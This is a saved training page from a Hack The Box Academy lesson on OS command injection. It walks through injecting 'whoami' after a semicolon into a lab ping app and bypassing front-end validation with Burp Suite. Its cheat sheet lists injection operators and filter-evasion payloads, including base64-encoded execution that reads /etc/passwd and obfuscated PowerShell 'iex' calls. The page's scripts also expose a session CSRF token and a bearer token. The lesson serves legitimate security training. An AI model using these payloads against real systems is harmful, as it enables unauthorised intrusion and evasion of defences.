<!DOCTYPE html>

<!-- saved from url=(0054)https://academy.hackthebox.com/module/109/section/1033 -->
<html lang="en"><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Command Injections</title>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="Premium Multipurpose Admin &amp; Dashboard Template" name="description"/>
<meta content="Themesbrand" name="author"/>
<link href="https://academy.hackthebox.com/images/favicon.ico" rel="shortcut icon"/>
<link href="https://academy.hackthebox.com/images/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
<link href="https://academy.hackthebox.com/images/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
<link href="https://academy.hackthebox.com/images/apple-touch-icon.png" rel="apple-touch-icon"/>
<link href="https://academy.hackthebox.com/images/safari-pinned-tab.svg" rel="mask-icon"/>
<link data-style="dark" href="./Command Injections3_files/bootstrap-dark.css" id="bootstrap-style" rel="stylesheet" type="text/css"/>
<link href="./Command Injections3_files/icons.css" rel="stylesheet" type="text/css"/>
<link data-style="dark" href="./Command Injections3_files/app-dark.css" id="app-style" rel="stylesheet" type="text/css"/>
<link data-style="dark" href="./Command Injections3_files/prism.css" id="app-style" rel="stylesheet" type="text/css"/>
<link href="./Command Injections3_files/toastr.min.css" rel="stylesheet" type="text/css"/>
<link href="./Command Injections3_files/ryt3opf.css" rel="stylesheet"/>
<script async="" src="./Command Injections3_files/awwxrc0h" type="text/javascript"></script><script async="" src="./Command Injections3_files/uwt.js.download" type="text/javascript"></script><script async="" src="./Command Injections3_files/insight.min.js.download" type="text/javascript"></script><script async="" src="./Command Injections3_files/346791856678772"></script><script async="" src="./Command Injections3_files/fbevents.js.download" type="text/javascript"></script><script async="" src="./Command Injections3_files/analytics.js.download" type="text/javascript"></script><script async="" src="./Command Injections3_files/commons.54701049fd6fb8497e9e.js.gz" status="loaded" type="text/javascript"></script><script async="" src="./Command Injections3_files/intercom.dynamic.js.gz" status="loaded" type="text/javascript"></script><script async="" src="./Command Injections3_files/twitter-ads.dynamic.js.gz" status="loaded" type="text/javascript"></script><script async="" src="./Command Injections3_files/linkedin-insight-tag.dynamic.js.gz" status="loaded" type="text/javascript"></script><script async="" src="./Command Injections3_files/facebook-pixel.dynamic.js.gz" status="loaded" type="text/javascript"></script><script async="" src="./Command Injections3_files/google-analytics.dynamic.js.gz" status="loaded" type="text/javascript"></script><script async="" crossorigin="anonymous" integrity="sha384-o1nfdUm9cV7Sx6HxXDsnady1EGmCBTwza/JTA6OSowyOK+wq0YF0+F9jejHVacaR" src="./Command Injections3_files/recaptcha__en.js.download" type="text/javascript"></script><script async="" src="./Command Injections3_files/analytics.min.js.download" type="text/javascript"></script><script>
        !function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(e){return function(){var t=Array.prototype.slice.call(arguments);t.unshift(e);analytics.push(t);return analytics}};for(var e=0;e<analytics.methods.length;e++){var key=analytics.methods[e];analytics[key]=analytics.factory(key)}analytics.load=function(key,e){var t=document.createElement("script");t.type="text/javascript";t.async=!0;t.src="https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(t,n);analytics._loadOptions=e};analytics._writeKey="eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I";analytics.SNIPPET_VERSION="4.13.2";
                analytics.load("eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I");
                                                        properties = {"platform":"Academy","platform_version":"V1","module_id":109,"module_name":"Command Injections","module_difficulty":"Medium","section_id":1033,"section_title":"Injecting Commands"};
                                                analytics.page(
                    "Module",
                    properties
                );
                                            }
        }();
    </script>
<style>
    .website-screenshot-url {
        height: 22px;
        cursor: text;
        padding-left: 10px;
    }
</style>
<script src="./Command Injections3_files/api.js.download"></script>
</head>
<body data-layout="detached" data-topbar="colored">
<div class="container-fluid">
<div id="layout-wrapper">
<header id="page-topbar">
<div class="navbar-header">
<div class="container-fluid">
<div class="float-right">
<div class="dropdown d-none d-lg-inline-block ml-1">
<a href="https://academy.hackthebox.com/billing">
<button class="btn btn-extra-light" type="button">
<i class="fad fa-cube text-success mt-1 mr-2"></i> Purchase Cubes
</button>
</a>
</div>
<div class="dropdown d-none d-lg-inline-block ml-1">
<button class="btn header-item noti-icon waves-effect" data-toggle="fullscreen" type="button">
<i class="mdi mdi-fullscreen"></i>
</button>
</div>
<div class="dropdown d-inline-block">
<button aria-expanded="false" aria-haspopup="true" class="btn header-item waves-effect" data-toggle="dropdown" id="page-header-user-dropdown" type="button">
<img alt="Header Avatar" class="rounded-circle header-profile-user" src="./Command Injections3_files/1782606024b767354a8c9d75e1a6323a"/>
<span class="d-none d-xl-inline-block ml-1">Tommy034</span>
<i class="mdi mdi-chevron-down d-none d-xl-inline-block"></i>
</button>
<div class="dropdown-menu dropdown-menu-right">
<a class="dropdown-item" href="https://academy.hackthebox.com/billing"><i class="bx bx-wallet font-size-16 align-middle mr-1"></i> Billing</a>
<a class="dropdown-item d-block" href="https://academy.hackthebox.com/settings"><i class="bx bx-wrench font-size-16 align-middle mr-1"></i> Settings</a>
<a class="dropdown-item d-block" href="https://academy.hackthebox.com/vpn"><i class="bx bx-server font-size-16 align-middle mr-1"></i> Vpn Settings</a>
<div class="dropdown-divider"></div>
<form action="https://academy.hackthebox.com/logout" method="POST"> <input name="_token" type="hidden" value="OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E"/> <a class="dropdown-item text-danger" href="https://academy.hackthebox.com/module/109/section/1033#" onclick="$(this).closest('form').submit()"><i class="bx bx-power-off font-size-16 align-middle mr-1 text-danger"></i> Logout</a>
</form>
</div>
</div>
</div>
<div class="d-flex align-items-center">
<div class="navbar-brand-box">
<a class="logo" href="https://academy.hackthebox.com/dashboard">
<span class="logo-sm">
<img alt="" height="30" src="./Command Injections3_files/logo.svg"/>
</span>
<span class="logo-lg">
<img alt="" height="36" src="./Command Injections3_files/logo.svg"/>
</span>
</a>
</div>
<button class="btn btn-sm px-3 font-size-16 header-item toggle-btn waves-effect" id="vertical-menu-btn" type="button">
<i class="fa fa-fw fa-bars"></i>
</button>
<div class="topnav">
<nav class="navbar navbar-light navbar-expand-lg topnav-menu">
<div class="collapse navbar-collapse" id="topnav-menu-content">
<ul class="navbar-nav active">
<li class="nav-item">
<a class="nav-link" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i>
Modules</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://academy.hackthebox.com/paths"><i class="mdi mdi-map-marker-path"></i> Paths</a>
</li>
</ul>
</div>
</nav>
</div>
</div>
</div>
</div>
</header>
<div class="main-content">
<div class="page-content">
<div class="row">
<div class="col-12">
<div class="page-title-box d-flex align-items-center justify-content-between">
<h4 class="page-title mb-0 font-size-18 letter-spacing-1">Command Injections  <i class="favouriteBtn fa fa-heart text-danger" data-module-id="109" data-original-title="" data-title="Toggle To-Do" data-toggle="tooltip" style="cursor:pointer;" title=""></i></h4>
<div class="page-title-right">
<ol class="breadcrumb m-0">
<li class="breadcrumb-item"><a href="javascript: void(0);">Page 3</a></li>
<li class="breadcrumb-item active">Injecting Commands</li>
</ol>
</div>
</div>
</div>
</div>
<div class="row justify-content-xl-center">
<div class="col-md-12 col-xl-9 col-xxl-7">
<div class="training-module">
<h1>Injecting Commands</h1>
<hr/>
<p>So far, we have found the <code>Host Checker</code> web application to be potentially vulnerable to command injections and discussed various injection methods we may utilize to exploit the web application. So, let's start our command injection attempts with the semi-colon operator (<code>;</code>).</p>
<hr/>
<h2>Injecting Our Command</h2>
<p>We can add a semi-colon after our input IP <code>127.0.0.1</code>, and then append our command (e.g. <code>whoami</code>), such that the final payload we will use is (<code>127.0.0.1; whoami</code>), and the final command to be executed would be:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">bash</span></div><pre class="language-bash"><code class="language-bash"><span class="token function">ping</span> -c <span class="token number">1</span> <span class="token number">127.0</span>.0.1<span class="token punctuation">;</span> <span class="token function">whoami</span>
</code></pre></div></div>
<p>First, let's try running the above command on our Linux VM to ensure it does run:</p>
<div class="window_container"><div class="window_content">
<div class="window_top">
<span class="window_dot bg-danger"></span>
<span class="window_dot bg-warning"></span>
<span class="window_dot bg-success"></span>
<span class="window_title"></span>
</div>
<pre class="language-shell-session" style="line-height: 0px;"><code class="language-shell-session"><span class="token info punctuation">21y4d@htb[/htb]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">ping</span> -c <span class="token number">1</span> <span class="token number">127.0</span>.0.1<span class="token punctuation">;</span> <span class="token function">whoami</span></span></span>

<span class="token output">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
21y4d
</span></code></pre></div></div>
<p>As we can see, the final command successfully runs, and we get the output of both commands (as mentioned in the previous table for <code>;</code>). Now, we can try using our previous payload in the <code>Host Checker</code> web application:
<img alt="Basic Injection" src="./Command Injections3_files/cmdinj_basic_injection.jpg"/></p>
<p>As we can see, the web application refused our input, as it seems only to accept input in an IP format. However, from the look of the error message, it appears to be originating from the front-end rather than the back-end. We can double-check this with the <code>Firefox Developer Tools</code> by clicking <code>[CTRL + SHIFT + E]</code> to show the Network tab and then clicking on the <code>Check</code> button again:</p>
<p><img alt="Basic Injection" src="./Command Injections3_files/cmdinj_basic_injection_network.jpg"/></p>
<p>As we can see, no new network requests were made when we clicked on the <code>Check</code> button, yet we got an error message. This indicates that the <code>user input validation is happening on the front-end</code>.</p>
<p>This appears to be an attempt at preventing us from sending malicious payloads by only allowing user input in an IP format. <code>However, it is very common for developers only to perform input validation on the front-end while not validating or sanitizing the input on the back-end.</code> This occurs for various reasons, like having two different teams working on the front-end/back-end or trusting front-end validation to prevent malicious payloads.</p>
<p>However, as we will see, front-end validations are usually not enough to prevent injections, as they can be very easily bypassed by sending custom HTTP requests directly to the back-end.</p>
<hr/>
<h2>Bypassing Front-End Validation</h2>
<p>The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP requests being sent by the application. To do so, we can start <code>Burp Suite</code> or <code>ZAP</code> and configure Firefox to proxy the traffic through them. Then, we can enable the proxy intercept feature, send a standard request from the web application with any IP (e.g. <code>127.0.0.1</code>), and send the intercepted HTTP request to <code>repeater</code> by clicking <code>[CTRL + R]</code>, and we should have the HTTP request for customization:</p>
<h4>Burp POST Request</h4>
<p><img alt="Basic Injection" src="./Command Injections3_files/cmdinj_basic_repeater_1.jpg"/></p>
<p>We can now customize our HTTP request and send it to see how the web application handles it. We will start by using the same previous payload (<code>127.0.0.1; whoami</code>). We should also URL-encode our payload to ensure it gets sent as we intend. We can do so by selecting the payload and then clicking <code>[CTRL + U]</code>. Finally, we can click <code>Send</code> to send our HTTP request:</p>
<h4>Burp POST Request</h4>
<p><img alt="Basic Injection" src="./Command Injections3_files/cmdinj_basic_repeater_2.jpg"/></p>
<p>As we can see, the response we got this time contains the output of the <code>ping</code> command and the result of the <code>whoami</code> command, <code>meaning that we successfully injected our new command</code>.</p>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below to complete this Section and earn cubes!</p>
<p class="card-title-desc font-size-large font-size-15">
Target: <span class="text-success"><span class="target" style="cursor:pointer;"><span class="spawnTargetBtn">Click here to spawn the target system!</span></span></span>
<button class="resetTargetBtn btn btn-light btn-sm" data-original-title="" data-title="Reset Target" data-toggle="tooltip" style="cursor: pointer; display: none;" title=""><i class="fad fa-sync text-warning"></i></button>
<br/>
<span class="targetLifeTimeContainer" style="display: none;">Time Left: <span class="targetLifeTime font-size-15">0</span> minutes</span>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2" data-target="#cheatSheetModal" data-toggle="modal"><i class="fad fa-file-alt mr-2"></i> Cheat Sheet</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="701"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Review the HTML source code of the page to find where the front-end input validation is happening. On which line number is it?</label>
<div class="row">
<div class="col-lg-8 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer701" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="701" id="btnAnswer701"><i class="fad fa-flag-checkered mr-2"></i> Submit</button>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-outline-warning btn-block" data-target="#hint701" data-toggle="modal" id="hintBtn701"><i class="fad fa-life-ring mr-2"></i> Hint</button>
</div>
</div>
<div class=""></div>
</div>
</div>
</div>
</div>
</div>
<div class="card bg-color-blue-nav" style="margin: 30px 0">
<div class="card-body">
<a class="btn btn-light module-button py-2" href="https://academy.hackthebox.com/module/109/section/1032" style="float: left"><i class="fa fa-arrow-alt-left mr-1"></i> Previous</a>
<form action="https://academy.hackthebox.com/module" class="form-inline" id="completeForm" method="POST" style="float: right">
<input name="module_id" type="hidden" value="109"/>
<input name="page_id" type="hidden" value="4"/>
<input name="completed" type="hidden" value="1"/>
<button class="btn btn-outline-success" id="completeBtn" style="display:none;"><i class="fa fa-check-circle"></i> Mark Complete &amp; Next</button>
</form>
<a class="btn btn-light ml-2 module-button py-2" href="Command Injections4.html" style="float: left">Next <i class="ml-1 fa fa-arrow-alt-right"></i></a>
</div>
</div>
</div>
<div class="col-md-12 col-xl-3 col-xxl-3">
<div id="table-of-contents">
<div class="card">
<div class="card-body bg-color-blue-nav">
<button class="btn btn-light btn-block module-button" data-target="#cheatSheetModal" data-toggle="modal"><i class="fad fa-file-alt mr-2"></i> Cheat Sheet</button>
<a class="btn btn-light btn-block module-button" href="https://academy.hackthebox.com/module/109/section/1033#questionsDiv"><i class="fad fa-question mr-2"></i> Go to Questions</a>
</div>
</div>
<div class="card" id="TOC">
<div class="card-body bg-color-blue-nav">
<h5 class="card-title font-size-15 mb-4">Table of Contents</h5>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1031">
<span class="font-size-13">Intro to Command Injections</span>
</a>
<h6 class="mt-4 mb-2">Exploitation</h6> <a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1032">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Detection</span>
</a>
<a class="btn text-primary btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1033">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Injecting Commands</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1034">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Other Injection Operators</span>
</a>
<h6 class="mt-4 mb-2">Filter Evasion</h6> <a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1035">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Identifying Filters</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1036">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Bypassing Space Filters</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1037">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Bypassing Other Blacklisted Characters</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1038">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Bypassing Blacklisted Commands</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1039">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Advanced Command Obfuscation</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1040">
<span class="font-size-13">Evasion Tools</span>
</a>
<h6 class="mt-4 mb-2">Prevention</h6> <a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1041">
<span class="font-size-13">Command Injection Prevention</span>
</a>
<h6 class="mt-4 mb-2">Skills Assessment</h6> <a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/109/section/1042">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Skills Assessment</span>
</a>
</div>
</div>
<div class="card">
<div class="card-body bg-color-blue-nav">
<h5 class="card-title mb-4">My Workstation</h5>
<div class="row">
<div class="col-12">
<div id="sidePreview" style="height: 160px; border: 1px solid #323232; border-radius: 5px; background-color: #0a121c; text-align: center">
<div class="screenPlaceholder">
<p class="instanceStart" style="padding-top:70px; letter-spacing: 5px;">OFFLINE</p>
<p class="instanceLoading" style="padding-top:70px; display: none"><i class="fa fa-circle-notch fa-spin"></i> Starting...</p>
</div>
</div>
</div>
<div class="col-12 mt-2">
<div class="instanceStart">
<button class="startInstanceBtn btn btn-light btn-sm mt-2 btn-block module-button py-2"><i class="fad fa-play-circle text-success"></i>  Start Instance</button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
</p>
</div>
<button class="fullScreenBtn btn btn-light btn-sm mt-2 module-button py-2" style="display:none;"><i class="fad fa-expand text-success"></i>  Interact</button>
<button class="terminateInstanceBtn btn btn-light btn-sm mt-2 module-button py-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate</button>
<button class="resetInstanceBtn btn btn-light btn-sm mt-2 module-button py-2" style="display:none;"><i class="fad fa-sync text-warning"></i>  Reset</button>
<div class="btn-group" role="group">
<button class="extendInstanceBtn btn btn-light btn-sm mt-2 module-button py-2" style="display:none; cursor: default;">Life Left: <span class="lifeLeft"></span>m</button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm mt-2 module-button py-2" data-original-title="" data-title="Extend Life" data-toggle="tooltip" style="display:none;" title=""><i class="fa fa-plus text-success"></i></button>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div aria-hidden="true" aria-labelledby="hint701" class="modal fade" id="hint701" role="dialog" tabindex="-1">
<div class="modal-dialog modal-dialog-centered">
<div class="modal-content">
<div class="modal-body">
<div class="text-center">
<h5><i class="fad fa-life-ring text-success"></i>  Hint</h5>
<br/>
<h6>You can either user burp or click [CTRL + U] in firefox to show the source code</h6>
</div>
</div>
</div>
</div>
</div>
<div aria-hidden="true" aria-labelledby="unlockModuleModal" class="modal fade" id="cheatSheetModal" role="dialog" tabindex="-1">
<div class="modal-dialog modal-lg">
<div class="modal-content">
<div class="modal-body">
<div class="text-center text-break">
<h5><i class="fad fa-file-alt"></i>  Cheat Sheet</h5>
<p>The cheat sheet is as a useful command reference for this module.</p>
<h2>Injection Operators</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Injection Operator</strong></th>
<th><strong>Injection Character</strong></th>
<th><strong>URL-Encoded Character</strong></th>
<th><strong>Executed Command</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Semicolon</td>
<td><code>;</code></td>
<td><code>%3b</code></td>
<td>Both</td>
</tr>
<tr>
<td>New Line</td>
<td><code>\n</code></td>
<td><code>%0a</code></td>
<td>Both</td>
</tr>
<tr>
<td>Background</td>
<td><code>&amp;</code></td>
<td><code>%26</code></td>
<td>Both (second output generally shown first)</td>
</tr>
<tr>
<td>Pipe</td>
<td><code>|</code></td>
<td><code>%7c</code></td>
<td>Both (only second output is shown)</td>
</tr>
<tr>
<td>AND</td>
<td><code>&amp;&amp;</code></td>
<td><code>%26%26</code></td>
<td>Both (only if first succeeds)</td>
</tr>
<tr>
<td>OR</td>
<td><code>||</code></td>
<td><code>%7c%7c</code></td>
<td>Second (only if first fails)</td>
</tr>
<tr>
<td>Sub-Shell</td>
<td><code>``</code></td>
<td><code>%60%60</code></td>
<td>Both (Linux-only)</td>
</tr>
<tr>
<td>Sub-Shell</td>
<td><code>$()</code></td>
<td><code>%24%28%29</code></td>
<td>Both (Linux-only)</td>
</tr>
</tbody>
</table></div>
<hr/>
<h1>Linux</h1>
<h2>Filtered Character Bypass</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th>Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>printenv</code></td>
<td>Can be used to view all environment variables</td>
</tr>
<tr>
<td><strong>Spaces</strong></td>
<td></td>
</tr>
<tr>
<td><code>%09</code></td>
<td>Using tabs instead of spaces</td>
</tr>
<tr>
<td><code>${IFS}</code></td>
<td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>)</td>
</tr>
<tr>
<td><code>{ls,-la}</code></td>
<td>Commas will be replaced with spaces</td>
</tr>
<tr>
<td><strong>Other Characters</strong></td>
<td></td>
</tr>
<tr>
<td><code>${PATH:0:1}</code></td>
<td>Will be replaced with <code>/</code></td>
</tr>
<tr>
<td><code>${LS_COLORS:10:1}</code></td>
<td>Will be replaced with <code>;</code></td>
</tr>
<tr>
<td><code>$(tr '!-}' '"-~'&lt;&lt;&lt;[)</code></td>
<td>Shift character by one (<code>[</code> -&gt; <code>\</code>)</td>
</tr>
</tbody>
</table></div>
<hr/>
<h2>Blacklisted Command Bypass</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th>Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Character Insertion</strong></td>
<td></td>
</tr>
<tr>
<td><code>'</code> or <code>"</code></td>
<td>Total must be even</td>
</tr>
<tr>
<td><code>$@</code> or <code>\</code></td>
<td>Linux only</td>
</tr>
<tr>
<td><strong>Case Manipulation</strong></td>
<td></td>
</tr>
<tr>
<td><code>$(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi")</code></td>
<td>Execute command regardless of cases</td>
</tr>
<tr>
<td><code>$(a="WhOaMi";printf %s "${a,,}")</code></td>
<td>Another variation of the technique</td>
</tr>
<tr>
<td><strong>Reversed Commands</strong></td>
<td></td>
</tr>
<tr>
<td><code>echo 'whoami' | rev</code></td>
<td>Reverse a string</td>
</tr>
<tr>
<td><code>$(rev&lt;&lt;&lt;'imaohw')</code></td>
<td>Execute reversed command</td>
</tr>
<tr>
<td><strong>Encoded Commands</strong></td>
<td></td>
</tr>
<tr>
<td><code>echo -n 'cat /etc/passwd | grep 33' | base64</code></td>
<td>Encode a string with base64</td>
</tr>
<tr>
<td><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td>
<td>Execute b64 encoded string</td>
</tr>
</tbody>
</table></div>
<hr/>
<h1>Windows</h1>
<h2>Filtered Character Bypass</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th>Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Get-ChildItem Env:</code></td>
<td>Can be used to view all environment variables - (PowerShell)</td>
</tr>
<tr>
<td><strong>Spaces</strong></td>
<td></td>
</tr>
<tr>
<td><code>%09</code></td>
<td>Using tabs instead of spaces</td>
</tr>
<tr>
<td><code>%PROGRAMFILES:~10,-5%</code></td>
<td>Will be replaced with a space - (CMD)</td>
</tr>
<tr>
<td><code>$env:PROGRAMFILES[10]</code></td>
<td>Will be replaced with a space - (PowerShell)</td>
</tr>
<tr>
<td><strong>Other Characters</strong></td>
<td></td>
</tr>
<tr>
<td><code>%HOMEPATH:~0,-17%</code></td>
<td>Will be replaced with <code>\</code> - (CMD)</td>
</tr>
<tr>
<td><code>$env:HOMEPATH[0]</code></td>
<td>Will be replaced with <code>\</code> - (PowerShell)</td>
</tr>
</tbody>
</table></div>
<hr/>
<h2>Blacklisted Command Bypass</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th>Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Character Insertion</strong></td>
<td></td>
</tr>
<tr>
<td><code>'</code> or <code>"</code></td>
<td>Total must be even</td>
</tr>
<tr>
<td><code>^</code></td>
<td>Windows only (CMD)</td>
</tr>
<tr>
<td><strong>Case Manipulation</strong></td>
<td></td>
</tr>
<tr>
<td><code>WhoAmi</code></td>
<td>Simply send the character with odd cases</td>
</tr>
<tr>
<td><strong>Reversed Commands</strong></td>
<td></td>
</tr>
<tr>
<td><code>"whoami"[-1..-20] -join ''</code></td>
<td>Reverse a string</td>
</tr>
<tr>
<td><code>iex "$('imaohw'[-1..-20] -join '')"</code></td>
<td>Execute reversed command</td>
</tr>
<tr>
<td><strong>Encoded Commands</strong></td>
<td></td>
</tr>
<tr>
<td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code></td>
<td>Encode a string with base64</td>
</tr>
<tr>
<td><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"</code></td>
<td>Execute b64 encoded string</td>
</tr>
</tbody>
</table></div>
</div>
</div>
<div class="modal-footer">
<a class="btn btn-light btn-block" href="https://academy.hackthebox.com/module/cheatsheet/109">Download Cheatsheet</a>
</div>
</div>
</div>
</div>
</div>
<footer class="footer">
<div class="container-fluid">
<div class="row">
<div class="col-sm-6">
</div>
<div class="col-sm-6">
<div class="text-sm-right d-none d-sm-block">
Powered by   <a href="https://www.hackthebox.com/" target="_blank"><img height="20px" src="./Command Injections3_files/logo-htb.svg" style="margin-bottom: 1px;"/></a>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</div>
<script src="./Command Injections3_files/jquery.min.js.download"></script>
<script src="./Command Injections3_files/bootstrap.bundle.min.js.download"></script>
<script src="./Command Injections3_files/metisMenu.min.js.download"></script>
<script src="./Command Injections3_files/simplebar.min.js.download"></script>
<script src="./Command Injections3_files/waves.min.js.download"></script>
<script src="./Command Injections3_files/toastr.min.js.download"></script>
<script src="./Command Injections3_files/axios.min.js.download"></script>
<script src="./Command Injections3_files/prism.js.download"></script>
<script src="./Command Injections3_files/main.js.download"></script>
<script>
    axios.defaults.headers.common = {
        'X-CSRF-TOKEN': 'OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E',
        'X-Requested-With': 'XMLHttpRequest',
        'Authorization': 'Bearer ' + 'jgfghW9jOUxTYrPOMG9i2ujbtUFdtKuilcFrKtLWJpv9gAzKxNnjcsm7Dg2wIx8ivYvDBp7jCWD5XRNP'
    };
</script>
<script>
    $('table').addClass('table table-striped text-left').wrap('<div class="table-responsive"></div>');

    $('.training-module a').attr('target','_blank').attr('rel','noopener nofollow');

    $( ".favouriteBtn" ).click(function() {
        let id = $(this).data('module-id');

        axios.get('/api/modules/favourite/'+id).then(response => {
            let data = response.data;
            if (data.fav === 1) {
                $(this).removeClass('far fa').addClass('fa');
                toastr["success"](data.message, "Success");
            } else {
                $(this).removeClass('far fa').addClass('far');
                toastr["success"](data.message, "Success");
            }
        });
    });

    function encode_utf8(string) {
    return unescape(encodeURIComponent(string));
  }

  $('.btnAnswer').click(function() {
    let question_id = $(this).data('question-id');
    $(this).attr('disabled', 1);
    let utf8EncodedString = encode_utf8($('#answer' + question_id).val());
    axios.post('/api/check/answer', {
      answer: btoa(utf8EncodedString),
      question_id: question_id
    }).then(response => {
      $(this).removeAttr('disabled');
      let data = response.data;
      if (data.success === 0) {
        toastr['error'](data.message, 'Error');
      } else {
        $(this).attr('disabled', 1);
        $('#answer' + question_id).attr('disabled', 1);
        $('#answer' + question_id).addClass('text-success');
        $('#hintBtn' + question_id).attr('disabled', 1);
        toastr['success'](data.message, 'Success');
        completeCheck();
      }
    });
  });

  $('.btnAnswerExercise').click(function() {
    let exercise_id = $(this).data('exercise-id');
    $(this).attr('disabled', 1);
    let utf8EncodedString = encode_utf8($(`#exerciseAnswer${exercise_id}`).val());
    axios.post(`/api/check/exercise/${exercise_id}/answer`, {
      answer: btoa(utf8EncodedString)
    }).then(response => {
      $(this).removeAttr('disabled');
      let data = response.data;
      if (data.success === 0) {
        toastr['error'](data.message, 'Error');
      } else {
        $(this).attr('disabled', 1);
        $(`#exerciseAnswer${exercise_id}`).attr('disabled', 1);
        $(`#exerciseAnswer${exercise_id}`).addClass('text-success');
        toastr['success'](data.message, 'Success');
      }
    });
  });

    
    $('.reveal-modal').click(e => {
        let id = $(e.target).data('exercise-id');
        $(`#revealExerciseAnswer${id}`).modal('hide');
    });

    $( document ).ready(function() {

        $('pre').filter(function () {
